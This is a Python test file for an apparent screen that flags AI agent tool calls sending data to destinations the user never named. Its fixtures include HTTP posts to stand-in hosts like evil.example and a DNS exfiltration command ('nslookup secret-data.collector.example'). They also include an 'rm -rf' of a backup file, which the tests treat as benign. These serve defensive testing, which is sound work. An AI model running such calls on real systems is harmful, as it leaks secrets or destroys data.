"""Tests for deterministic screens: the external-destination floor."""

import unittest
from pathlib import Path

from agentcheck import screens


class TestExternalDestination(unittest.TestCase):
    def test_unnamed_url_fires(self):
        self.assertIsNotNone(screens.external_destination_unnamed(
            {"request": "Check the report", "tool": "http_post",
             "args": {"url": "https://collector.example/x"}}))

    def test_named_destination_silent(self):
        self.assertIsNone(screens.external_destination_unnamed(
            {"request": "Post the report to https://hooks.acme.co/r",
             "tool": "http_post",
             "args": {"url": "https://hooks.acme.co/r"}}))

    def test_named_email_local_part_silent(self):
        self.assertIsNone(screens.external_destination_unnamed(
            {"request": "Email Priya the draft", "tool": "send_email",
             "args": {"to": "priya@example.com"}}))

    def test_read_with_no_destination_silent(self):
        self.assertIsNone(screens.external_destination_unnamed(
            {"request": "Summarize inbox", "tool": "read_file",
             "args": {"path": "inbox.txt"}}))

    def test_dns_exfil_fires(self):
        self.assertIsNotNone(screens.external_destination_unnamed(
            {"request": "Resolve this hostname", "tool": "shell_exec",
             "args": {"cmd": "nslookup secret-data.collector.example"}}))

    def test_benign_shell_silent(self):
        for cmd in ("ls /tmp", "rm -rf /backups/daily.tar.gz",
                    "df -h", "git status"):
            self.assertIsNone(screens.external_destination_unnamed(
                {"request": "do the thing", "tool": "shell_exec",
                 "args": {"cmd": cmd}}), cmd)

    def test_floor_only_touches_pass(self):
        p = {"trace_verdict": "pass"}
        screens.apply(p, {"request": "x", "tool": "http_post",
                          "args": {"url": "https://evil.example"}})
        self.assertEqual(p["trace_verdict"], "review")
        self.assertEqual(p["screen"]["rule"],
                         "external_destination_unnamed")
        for v in ("review", "fail"):
            p = {"trace_verdict": v}
            screens.apply(p, {"request": "x", "tool": "http_post",
                              "args": {"url": "https://evil.example"}})
            self.assertEqual(p["trace_verdict"], v)
            self.assertIsNone(p["screen"])


class TestScreenInCheckPath(unittest.TestCase):
    def test_check_path_floors_and_records(self):
        from fastapi.testclient import TestClient
        from agentcheck.proxy import create_app
        from agentcheck.store import Store
        import tempfile
        store = Store(Path(tempfile.mkdtemp()) / "s.db")
        key = store.create_key("s", qpm_limit=60000)
        c = TestClient(create_app(store, default_judge="stub"))
        h = {"Authorization": f"Bearer {key}"}
        r = c.post("/v1/check", headers=h, json={
            "trace": {"request": "Resolve this hostname",
                      "tool": "shell_exec",
                      "args": {"cmd": "nslookup secret-data.collector.example"}}})
        self.assertEqual(r.status_code, 200, r.text)
        d = r.json()
        # the stub passes everything; the screen floors to review
        if d.get("trace_verdict") == "pass":
            self.fail("screen did not floor an unnamed destination")
        self.assertIsNotNone(d.get("screen"))


if __name__ == "__main__":
    unittest.main()
